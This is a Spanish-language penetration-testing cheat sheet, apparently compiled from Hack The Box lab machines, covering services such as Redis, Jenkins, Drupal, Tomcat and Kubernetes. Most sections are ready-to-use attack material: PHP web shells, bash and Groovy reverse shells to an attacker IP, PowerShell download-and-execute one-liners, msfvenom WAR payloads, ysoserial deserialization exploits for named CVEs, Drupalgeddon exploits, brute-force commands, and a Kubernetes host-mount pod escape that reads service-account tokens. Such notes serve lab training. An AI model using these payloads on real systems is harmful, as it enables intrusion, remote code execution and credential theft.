evil-winrm -i 10.10.11.152 -S -c cert.pem -k key.pem
```
### Redis 6379 tcp
- Para enumerar el servicio Redis mirar en hacktricks: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
```bash
sudo apt-get install redis-tools # Instalar

> Puedo acceder al servicio asi:
redis-cli -h 127.0.0.1
nc 127.0.0.1 6379

> Para tener una shell interactiva a través del navegador
# Creo un archivo cmd.php con el siguiente contenido (tengo que dejar al menos 3 lineas arriba y abajo del contenido): <?php system($_REQUEST['cmd']); ?>
cat cmd.php | redis-cli -h 127.0.0.1 -x set cmd # Importar el contenido del archivo a redis
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4 # Indicar el directorio donde quiero que esté el archivo, en este ejemplo el directorio 8924d0549008565c554f8128cd11fda4 es uno de la máquina reddish
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php" # Poner nombre al archivo
redis-cli -h 127.0.0.1 save # Guardar los cambios
# Ahora accedo desde el navegador al archivo cmd.php e intento ejecutar comandos
```
### H2 Database Console 8082 tcp
- H2 es un sistema de administrador de base de datos relacionales hecho con Java creado principalmente para entornos de desarrollo.
```bash
Preferences > Allow connections from other computers > Save # Para permitir el acceso de todos los usuarios desde el navegador
JDBC URL: jdbc:h2:~/test # Si no puedo conectarme, cambiar el recurso que aparece, en este ejemplo test. Cambiar a cualquier otra cosa

> Ejecutar comandos: En este ejemplo se han modificado los permisso de la /bin/bash

Fuente: https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('chmod u+s /bin/bash')
```
### Memcached 11211 tcp
- Memcached es un sistema de almacenamiento en caché de alto rendimiento.
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/11211-memcache

nc 127.0.0.1 11211 # Para conectarme e interactuar con el servicio
> Algunos comandos:
version
stats
stats items
stats cachedump 1 0
get user # Solicita el contenido del item user depositado en cachedump
get passwd # Solicita el contenido del item passwd depositado en cachedump
```
### GlusterFS 24007 49251 49152 tcp
- GlusterFS es un sistema de gestión de archivos. Aquí podemos encontrar información sobre el servicio: https://book.hacktricks.xyz/network-services-pentesting/24007-24008-24009-49152-pentesting-glusterfs
- Herramientas para la gestión y enumeración del servicio:
```bash
sudo apt-get install glusterfs-cli glusterfs-client glusterfs-server # Instalar
```
- Comandos utiles para enumerar y gestionar el servicio:
```bash
sudo gluster --remote-host=10.10.11.131 volume list # Me devuelve los volumenes disponibles
sudo mount -t glusterfs 10.10.11.131:/vol1 /mnt/glusterVol1 # Me monta el volumen en la ruta de mi sistema que elija. Tengo que crear la carpeta glusterVol1
/var/log/glusterfs/ # Si me da un error miro los logs donde está ruta para ver que pasa y si no encuentro solución, miro el siguiente volumen
sudo mount -t glusterfs 10.10.11.131:/vol2 /mnt/glusterVol2 # El otro volumen
```
### Mongodb 27017 tcp
- Instalar y utilizar mongosh:
```bash
https://www.mongodb.com/try/download/shell # Descargar
sudo dpkg -i mongodb-mongosh_1.5.4_amd64.deb # Instalar

https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb # Enumerar

mongosh # Iniciar
show dbs # Ver las bases de datos existentes
use admin # Usar una base de datos, en este caso admin
show collections # Ver collections de la base de datos seleccionada
db.system.keys.find() # Dumpear el contenido del collections "system.keys"
```
#### Dumpear la base de datos mongoDB:
- De esta forma también puedo ver el contenido de la base de datos en la propia máquina objetivo:
```bash
mongodump # Crea una carpeta con todo el contenido dumpeado de la base de datos. Los archivos tienen el formato bson
bsondump users.bson # Para ver el contenido de los archivos dumpeados .bson
```
### Jenkins 8080 50000 tcp
- Un cms Jenkins puede estar corrien por diferentes puertos, como el 80, 8080 o el 50000 que son los mas comunes. Este cms está corriendo sobre un servicio http y si me encuentro un uno, puedo intentar ejecutar comandos a través de una consola (Script Console) que trae incorporada este cms.
La ruta dentro del cms sería: Manage Jenkins>Script Console y puedo intentar ejecutar un script en Groovy para enviarme una reverse shell:
```bash
String host="10.10.14.9";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- Otra opción sería compartir un servicio smbserver con nc.exe y desde la Script Console ejecutar el comando en Grooby (de esta segunda forma además de obtener una shell conseguimos el hash net-NTLMv2):
```bash
impacket-smbserver smbFolder $(pwd) -smb2support # Servicio compartiendo el nc.exe
printnl "\\\\10.10.14.9\\smbFolder\\nc.exe -e cmd 10.10.14.9 443".execute().text # Código en Grooby para obtener una reverse shell.
```
### TFTP 21 udp
- Comandos útiles:
```bash
tftp aquivalaip # Entrar
put evil /etc/apt/apt.conf.d/evil # Subir archivos
```
### SNMP 161 udp
- Para ver el contenido de forma mas gráfica:
```bash
sudo nano /etc/snmp/snmp.conf # Editar este archivo comentando la linea "mibs :", queraría así # mibs :
sudo apt install snmp-mibs-downloader # Instalar
```
- Para enumerar el servicio:
```bash
snmpwalk -v 1 -c public 10.10.11.107
snmpenum 10.10.11.136 public linux.txt
snmpbulkwalk -v 2c -c public 10.10.11.136 > snmp_enum
```
- Si necesito saber cual es la community strings puedo utilizar fuerza bruta:
```bash
sudo nmap -sU --script snmp-brute 10.10.10.92 --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
onesixtyone 10.10.10.92 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```
- Para intenter descubrir una contraseña por snmp:
```bash
snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 # El resultado es un hexadecimal que ponemos en cyberchef para ver si el resultado es una contraseña
```
- Si tenemos una contraseña y el servicio `telnet está abierto 23` podemos intentar entrar con: `telnet 10.10.11.107`. Y después si estoy en el grupo ls podemos intentar realizar una reverse shell con python, mirar reverse shell: https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e
- Por ejemplo, para ver la direccion ipv6 (de este modo solo me muestra el ipAddressType):
```bash
snmpwalk -v 1 -c public 10.10.10.92 ipAddressType
```
- Algunos identificadores del servicio snmp (udp):
```bash
IP Addresses 1.3.6.1.2.1.4.34.1.3 # Identificador: ipAddressType
Running Processes 1.3.6.1.2.1.25.4.2.1.2  # Identificador: hrSWRunName
System Information 1.3.6.1.2.1.1.1
Hostname 1.3.6.1.2.1.1.5
Uptime 1.3.6.1.2.1.1.3
Mountpoints 1.3.6.1.2.1.25.2.3.1.3
Running Software Paths 1.3.6.1.2.1.25.4.2.1.4
Running Software Parameters 1.3.6.1.2.1.25.4.2.1.5
Listening UDP Ports 1.3.6.1.2.1.7.5.1.2.0.0.0.0
Listening TCP Ports 1.3.6.1.2.1.6.13.1.3.0.0.0.0
Network Information 1.3.6.1.2.1.4.20.1

Lista más clompleta: https://content.cisco.com/chapter.sjs?uri=/searchable/chapter/www.cisco.com/content/en/us/td/docs/security/nac/appliance/configuration_guide/49x/cam/49xcam-book/m_apx_mib.html.xml
```
### Wordpress
- Rutas útiles:
```bash
http://<IP>/wp-json/wp/v2/users/ # Enumerar usuarios. Desde consola: curl -s -X GET http://<IP>/wp-json/wp/v2/users/ | jq
http://<IP>/index.php/wp-json/wp/v2/users/ # Enumerar usuarios.
wp-config.php # Primero encontrar donde está la instalación de Wordpress
http://10.10.11.125/wp-content/plugins/
http://10.10.11.125/wp-content/themes/

/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/default-ssl.conf

/usr/share/

/etc/nginx/sites-enabled/default
/etc/nginx/sites-available/default
```
- Para mandarme una reverse shell desde wordpress con el `archivo 404.php`, primero lo modifico y después apunto a su ruta que es:
```bash
http://ip/?p=404.php
```
#### wpscan
```bash
Uso: https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
wpscan --update
wpscan --url http://10.10.11.125/ -e u,ap --api-token $wpscan_token --plugins-detection aggressive # Encontrar usuarios y todos los plugins
wpscan --url http://10.10.11.125/ -e u,at --api-token $wpscan_token --themes-detection aggressive # Encontrar usuarios y todos los themes

# Separar con comas los parámetros para enumerar varias cosas a la vez

--detection-mode aggressive
u # Usuarios
vp # Plugins vulnerables
ap # Todos los plugins
p # Plugins populares
vt # Themes vulnerables
at # Todos los themes
t # Themes polulares
-t 50 # Hilos

> Fuerza bruta:
wpscan --url http://apocalyst.htb/ -U list_users.txt -P list_passwords.txt # Fuerza bruta lista usuarios y contraseñas
wpscan --url http://apocalyst.htb/ -U falaraki -P list_passwords.txt # Fuerza bruta usuario falaraki

> Diccionarios:
--plugins-detection aggressive # Prueba 101095 plugins
https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/master/plugins.txt # Diccionario de 80085 plugins
/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt # Diccionario de 13368 plugins
--themes-detection aggressive # Prueba 24893 themes
/usr/share/seclists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt # Diccionario de 3646 themes
```
#### xmlrcp
- ListMethods
```bash
Fuente: https://codex.wordpress.org/XML-RPC/system.listMethods

curl -s -X POST "http://<IP>/xmlrpc.php" -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
```
- Despúes de listar los métodos, podemos utilizar los métodos diponibles para obtener información o realizar modificaciones si tenemos credenciales válidas. En este ejemplo se modifica el código en base64 de un post para cambiarlo por una webshell y finalmente subir un archivo:
```bash
Fuente: https://youtu.be/67TQsX88EtM?t=4204
Fuente: https://0xdf.gitlab.io/2022/02/03/htb-pressed.html

pip install python-wordpress-xmlrpc # Instalar

python # Con la consola interactiva de python                           
>>> from wordpress_xmlrpc import Client
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> post = client.call(posts.GetPosts())
>>> post
.
.
>>> dir(post[0]) #Para ver que puedo obtener de este objeto
.
.
>>> post[0].content # Para obtener el contenido del post

# Ahora desde esta misma sesión interactiva de python puedo intentar editar el contenido del post:

>>> evil_post = post[0]
>>> evil_post.content # EL contenido tiene que ser igual al post original
.
.
>>> evil_post.content = 'Aquí pego el contenido del post original con la modificación que he realizado' # Esto es para crear mi post malicioso tal y como quiero que sea
>>> client.call(posts.EditPost(evil_post.id, evil_post)) # De esta forma es como cambio el post original por mi post malicioso, devuelve True
True

# Hasta aquí el ejemplo para crear una webshell, desde aquí el ejemplo de como subir un archivo:
>>> from wordpress_xmlrpc import Client
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> from wordpress_xmlrpc.methods import media
>>> with open('pkwner.sh', 'r') as f:
...     script = f.read()
... 
>>> script
>>> data = { 'name': 'pkwner.png', 'bits': script, 'type': 'text/plain' }
>>> client.call(media.UploadFile(data))
```
### Joomla
#### Rutas útiles:
```bash
http://example.htb/administrator/
http://example.htb/administrator/index.php
```
- Para mandarme una reverse shell desde Joomla con el archivo error.php:
```bash
system("bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'"); # Añado este comado dentro del archivo error.php
# Después apunto a su ruta que es: http://ip/error.php o http://ip/templates/protostar/error.php (cambiar protostar por el nombre del tema que se esta usando).

> También puedo hacerlo creando una nueva página, por ejemplo shell.php con:

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"); ?>
 ```
#### Joomscan
```bash
joomscam -u http://10.10.10.10/
``` 
### Drupal
- Drupal es un cms de gestión de contenidos. Estas son algunas formas de explotar el cms en versiones vulnerables.
Revisar rutas:
```bash
http://10.10.10.9/changelog.txt
/var/www/html/sites/default/settings.php
```
- Conseguir una reverse shell (1ª Forma):
```bash
sudo apt-get install php-curl # Instalar
searchsploit -m php/webapps/41564.php # Este exploit contempla dferentes versiones vulnerables

> Modificar los siguientes apartados del exploit:
url = 'http://10.10.10.9';
$endpoint_path = '/rest'; # Comprobar si la ruta correcta es rest o rest_endpoint
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'reverse.php',
    'data' => '<?php echo "<pre>" . shell_exec($_REQUEST[\'cmd\']) . "</pre>"; ?>'
];

> Ejecurar:
php exploit.php # Ejecuto el exploit
# Me comparto con un servidor con python el archivo Invoke-PowerShellTcp.ps1 que ya tengo modificado en el repositorio y me pongo en escucha
http://10.10.10.9/shell.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1') # Ahora desde el navegador ejecutamos el comando para conseguir la shell.
```
- Conseguir una reverse shell (2ª Forma):
```bash
sudo apt-get install php-curl # Instalar
searchsploit -m php/webapps/41564.php # Este exploit contempla dferentes versiones vulnerables

> Modificar los siguientes apartados del exploit:
url = 'http://10.10.10.9';
$endpoint_path = '/rest'; # Comprobar si la ruta correcta es rest o rest_endpoint
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'reverse.php',
    'data' => '<?php system("cmd /c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.6/Invoke-PowerShellTcp.ps1\')"); ?>'
];

> Ejecurar:
php exploit.php # Ejecuto el exploit
# Me comparto con un servidor con python el archivo Invoke-PowerShellTcp.ps1 que ya tengo modificado en el repositorio, me pongo en escucha y visito la url que me da el exploit

# Además de system se pueden usar otras funciones como shell_exec
```
- Conseguir una reverse shell, en este caso la shell será a través del exploit (3ª Forma):
```bash
sudo gem install highline # Instalar
searchsploit -m php/webapps/44449.rb  # Este exploit contempla dferentes versiones vulnerables

> Ejecurar:
ruby 44449.rb http://10.10.10.9 # Ejecuto el exploit
```
- Conseguir una reverse shell (4ª Forma):
```bash
git clone https://github.com/oways/SA-CORE-2018-004
chmod +x drupalgeddon3.py

# Al ejecutar el exploit anterior se crea un archivo session.json con una apariencia parecida a esta (estos datos son de ejemplo):

{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "dIArzxFsjaZWKFcYt8R3YZTpJ1grdpIOu7JrUCUzxx4",
    "token": "a6yftKQs82D_bqwQaWb8UQ4rdQmL81TfRIcnh8AgvO8"
} 

# También me pide el numero de nodo, en este caso es el 1

> Ejecurar:
# Me comparto con un servidor con python el archivo Invoke-PowerShellTcp.ps1 que ya tengo modificado en el repositorio y me pongo en escucha
python3 drupalgeddon3.py http://10.10.10.9 "SESSd873f26fc11f2b7e6e4aa0f6fce59913=dIArzxFsjaZWKFcYt8R3YZTpJ1grdpIOu7JrUCUzxx4" 1 "\\\\10.10.14.7\\smbFolder\\nc.exe -e cmd 10.10.14.7 4444" # Ejecuto el exploit
```
- Conseguir una reverse shell (5ª Forma):
```bash
# Drupal 7.56
Fuente: https://github.com/dreadlocked/Drupalgeddon2

git clone https://github.com/dreadlocked/Drupalgeddon2
sudo gem install highline  # Instalar

./drupalgeddon2.rb http://10.10.10.233
```
- Conseguir acceder como admin al cms:
```bash
# Al ejecurar el exploit anterior se crea un archivo session.json con una apariencia parecida a esta (estos datos son de ejemplo):

{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "DN_5KSCGhyX8xwD6egmYOzKJaF2wfERoL0IcObmN_Eg",
    "token": "a6yftKQs82D_bqwQaWb8UQ4rdQmL81TfRIcnh8AgvO8"
} 

# Ahora si utilizo las herramientas del navegador para modificar o crear un nuevo registro de sesión con estas credenciales, al recargar la página ya seré admin.
SESSd873f26fc11f2b7e6e4aa0f6fce59913
DN_5KSCGhyX8xwD6egmYOzKJaF2wfERoL0IcObmN_Eg
```
- Para mandarme una reverse shell estando ya dentro del Drupal:
```bash
Modules > PHP Filter # Activo el PHP Filter
Content > Add content > Article 
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"); ?> # Creo un artículo con este contenido seleccionando PHP code
```
### Bolt
- Para mandarme una reverse shell desde Bolt navego por Configuration > All configuration files y edito algún archivo php que exista:
```bash
system("bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'"); # Añado este comado dentro del archivo por ejemplo bundles.php
# Después me pongo en escucha y apunto a su ruta que es: http://ip/bundles.php
```
### Apache
- Rutas que pueden tener información:
```bash
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/default-ssl.conf
```
### Tomcat
- Rutas que pueden tener información:
```bash
apt install tomcat9 # Instalar

/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml
```
#### web
- Para explotar un servicio tomcat tenemos que crear u subir un archivo `.war`:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war # Creamos el payload y lo subimos desde el panel de usuario de tomcat.
# Ahora, me pongo en escucha y accedo a mi deploy
```
##### Por terminal
- Si tenemos credenciales válidas pero aun asi no podemos acceder a la parte del panel de Tomcat para subir el .war, podemos hacerlo con curl (Fuente: https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script):
```bash
curl -s -X GET -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/list' # Primero vemos las aplicaciones que se estan ejecutando
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f war > shell.war # Creamos el payload

> Intento subir el .war y ejecutar el deploy con alguno de los siguientes comandos, hasta que me de el OK:
curl -s -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse&update=true'
curl -s -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse' --upload-file shell.war

http://10.10.10.194:8080/reverse # Ahora, me pongo en escucha y accedo a la url de mi deploy
```
#### Tomcat CVE-2020-9484
- La vulnerabilidad CVE-2020-9484 permite ejecución remota de código a través de deserialización en versiones de Apache Tomcat anteriores a abril de 2020. Este ejemplo se va a realizar sobre un Apache Tomcat 9.0.27, ejmpplo máquina Feline.
```bash
# Fuente: https://www.hackplayers.com/2021/01/cve-2020-9484-rce-tomcat.html
# Dercarga ysoserial-all.jar: https://github.com/frohoff/ysoserial/releases/tag/v0.0.6

> Ejemplo prueba RCE
java -jar ysoserial-all.jar CommonsCollections2 'ping -c 4 10.10.14.9' > ping.session # Creo un archivo con data serializada
sudo tcpdump -i tun0 icmp # Me pongo en escucha de trazas icmp
curl -s -X GET "http://10.10.10.205:8080" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/ping" # Hago la petición para que se produzca la deserialización del archivo

> Conseguir reverse shell
# Primero: subimos el archivo
sudo java -jar ysoserial-all.jar CommonsCollections2 'curl 10.10.14.9 -o /tmp/reverse.sh' > reverse.session # Creo un archivo con data serializada y lo subo en el campo de subida de archivos de la web
# Creo un index.html con este contenido, me comparto un servidor con python
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.9/443 0>&1
curl -s -X GET "http://10.10.10.205:8080" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/reverse" # Hago la petición para que se produzca la deserialización del archivo

# Segundo: permisos de ejecución
sudo java -jar ysoserial-all.jar CommonsCollections2 'chmod +x /tmp/reverse.sh' > reverse2.session # Creo un archivo con data serializada y lo subo en el campo de subida de archivos de la web
curl -s -X GET "http://10.10.10.205:8080" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/reverse2" # Hago la petición para que se produzca la deserialización del archivo

# Tercero: ejecutar el archvo
sudo java -jar ysoserial-all.jar CommonsCollections2 '/tmp/reverse.sh' > reverse3.session # Creo un archivo con data serializada y lo subo en el campo de subida de archivos de la web
curl -s -X GET "http://10.10.10.205:8080" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/reverse3" # Me pongo en escucha y hago la petición para que se produzca la deserialización del archivo
```
#### Tomcat CVE-2020-9496
- La vulnerabilidad CVE-2020-9496 permite ejecución remota de código a través de la petición de XML-RPC, ya que es vulnerable a problemas de deserialización no segura y Cross-Site Scripting en Apache OFBiz. Este ejemplo se va a realizar sobre un Apache Tomcat 9.0.31, ejemplo máquina Monitors.
```bash
# Fuente: https://packetstormsecurity.com/files/163730/Apache-OfBiz-17.12.01-Remote-Command-Execution.html
# Dercarga ysoserial-all.jar: https://github.com/frohoff/ysoserial/releases/tag/v0.0.6

> Conseguir reverse shell
# Primero: Creamos el archivo
# Creo un reverse.sh con este contenido y me lo comparto a través de un servidor con python
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.9/443 0>&1

# Segundo: Crear la data serializada para subir el archvo
java -jar ysoserial-all.jar CommonsBeanutils1 "wget http://10.10.14.9/reverse.sh -O /tmp/reverse.sh" | base64 | tr -d "\n";echo # Creo la data serializada
# El comando anterior generará un payload que incorporaré en el siguiente comando en el campo Payload
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>Payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' # Hago la petición para que se produzca la deserialización

# Tercero: Crear la data serializada para ejecurar el archivo
java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/reverse.sh" | base64 | tr -d "\n";echo # Creo la data serializada y me pongo en escucha
# El comando anterior generará un payload que incorporaré en el siguiente comando en el campo Payload
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>Payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' # Hago la petición para que se produzca la deserialización
```
### Nginx
- Rutas que pueden tener información:
```bash
/etc/nginx/sites-enabled/default
/etc/nginx/sites-available/default
/etc/nginx/nginx.conf

/var/log/nginx/access.log
/var/log/nginx/error.log
```
### Flask
#### Flask JWT
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

pip3 install flask-unsign # Instalar

flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidG9tYXMifQ.Y39JCg.f8Xh7Tagtz91wBdDTAqrNtTn7dM' # Ver el contenido del JWT

> Fuerza bruta para averiguar el secreto utilizando el JWT de mi usuario registrado:
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidG9tYXMifQ.Y39JCg.f8Xh7Tagtz91wBdDTAqrNtTn7dM' --no-literal-eval

> Si he conseguido el secreto y tengo un usuario válido, puedo intentar crear un nuevo JWT para ese usuario:
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
```
### Dompdf
- En la versión 0.6.0 se pueden leer archivos internos del equipo objetivo:
```bash
10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd # Se hace la petición y se genera un pdf con el contenido del archivo codificado en base64
```
### vnc
- Para conectarme: `vncserver password`
- Si veo el `servicio vnc`, puedo intentar conectarme con vncviewer: primero pongo `vncviewer` y en la ventana que se abre pongo la ip y el pueto de la máquina objetivo.
### webdav
- Si tengo un servicio `webdav` puedo intentar probar que tipos de archivos me permite subir o gestionar:
```bash
davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69
```
- Y si me permite subir, por ejemplo archivos php, puedo intentar subir un archivo:
```bash
<?php system($_REQUEST['cmd']); ?> # Primero creo un archivo shell.php en mi equipo
curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php # Después intento subirlo
```
- Si por reglas de firewall no me permite enviarme una reverse shell, puedo intentar utilizar una fake shell como esta: 
```bash
https://github.com/s4vitar/ttyoverhttp # Me descargo el script y lo modifico incluyendo la url del archivo que he subido: http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php # Esta url esla que incluyo (ejemplo máquina Inception) y déspues ejecuto el script en mi equipo
```
### Kubernetes
- El servicio Kubernetes puede estar relacionado con alguno de los suiguientes puertos: `2379,2380,8443,10249,10250,10256`. Otros indicadores de que puedo estar ante un kubernetes es encontrar algo como: `etcd, minikube, InfluxDB`								
- Para enumerarlo puedo empezar revisando: `https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes`
- Para enumerarlo me instalo la herramuenta `kubeletctl` así:
```bash
wget https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```
- Kubeletctl toma por defecto el puerto 10250. Para emperar a enumerar el servicio puedo poner (con kubeletctl -h puedo ver los diferentes comandos que puedo utilizar para enumerar, en este ejemplo pods):
```bash
kubeletctl -s 10.10.11.133 pods
```
- Con el comando scan y rce puedo ver si en alguno de los pods puedo ejecutar comandos (para ver el panel de ayuda: kubeletctl -s 10.10.11.133 scan -h):
```bash
kubeletctl -s 10.10.11.133 scan rce
```
- Ahora compruebo que puedo ejecutar comandos, conforme a lo que hemos visto antes, en el pods nginx y en el contenedor nginx:
```bash
kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "whoami"
```
- Existe la posibilidad que me de directamente una shell en el contenedor:
```bash
kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "bash"
```
- Si he conseguido acceder a un pods puedo intentar conseguir información como certificados y tokens para intentar escalar privilegios, puedo intentar ver el ca.crt y el token:
```bash
kubeletctl -s 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
kubeletctl -s 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```
- Ahora meto el certiticado en un archivo llamado ca.crt y el valor del token lo utilizo entre comillado simple dentro del comando (en este ejemplo intento acceder al pod que esta corriendo por el puerto 8443):
```bash
kubectl --token='<VALOR_DEL_TOKEN>' --certificate-authority=ca.crt -s https://10.10.11.133:8443 get pods
```
- Para ver que puedo hacer con las credenciales que tengo puedo utilizar `auth can-i --list`:
```bash
kubectl --token='<VALOR_DEL_TOKEN>' --certificate-authority=ca.crt -s https://10.10.11.133:8443 auth can-i --list
```
- Ahora intento crear mi propio pod, primero miro el archivo yaml del pod de ngins que está creado:
```bash
kubectl --token=$token --certificate-authority=ca.crt -s https://10.10.11.133:8443 get pod nginx -o yaml
```
- Después me descargo el contenido del archivo yaml:
```bash
kubectl --token=$token --certificate-authority=ca.crt -s https://10.10.11.133:8443 get pod nginx -o yaml > evil.yaml
```
- Ahora que se la estructura del pod, intento crear uno en el que quiero que se cree una montura para poder acceder a los archivos de la máquina objetivo, primero creo un nuevo evil.yaml con los siquientes datos:
```bash
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
- Después creo el pod: 
```bash
kubectl --token=$token --certificate-authority=ca.crt -s https://10.10.11.133:8443 apply -f evil.yaml
```
- Ahora intento acceder al root.txt de la montura:
```bash
kubeletctl --server 10.10.11.133 exec "cat /root/root/root.txt" -p nginxt -c nginxt
kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "bash" # O Puedo intentar acceder al pod ejecutando el comando bash
```
- También puedo crear un yaml con el comando que quiero que se ejecuto directamente, primero creo el yaml:
```bash
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    command: ["bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.10/443 0>&1"]
    volumeMounts:
    - mountPath: /root
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
- Segundo, me pongo en escucha y creo el pod:
```bash
kubectl --token=$token --certificate-authority=ca.crt -s https://10.10.11.133:8443 apply -f mi.yaml
```
### Docker
- Comandos útiles en docker:
```bash
sudo docker search ubuntu # Ver si la imagen está disponible
sudo docker create ubuntu:16.04 # Crear un contenedor docker e instalar una versión concreta
sudo docker images # Ver las imágenes que estan creadas
sudo docker run -it b6f507652425 # Acceder como root a una imagen creada indicando el ID de la imagen
sudo docker exec -it b94d0e176814 bash # Acceder como root a una imagen creada indicando el ID de la imagen
sudo docker rm $(docker ps -a -q) --force # Borrar todos los contenedores activos
docker rm 40b966d7252f # Eliminar un contenedor
sudo docker rmi $(docker ps -a -q) # Borrar todas las imágenes
docker rmi 40b966d7252f --force # Eliminar la imagen de un contenedor
docker restart 09ca6feb6efc # Reiniciar un contenedor
docker stop 09ca6feb6efc # Parar un contenedor
docker start 09ca6feb6efc # Iniciar un contenedor
sudo docker ps # Ver que contenedores y que imágenes están en uso
```
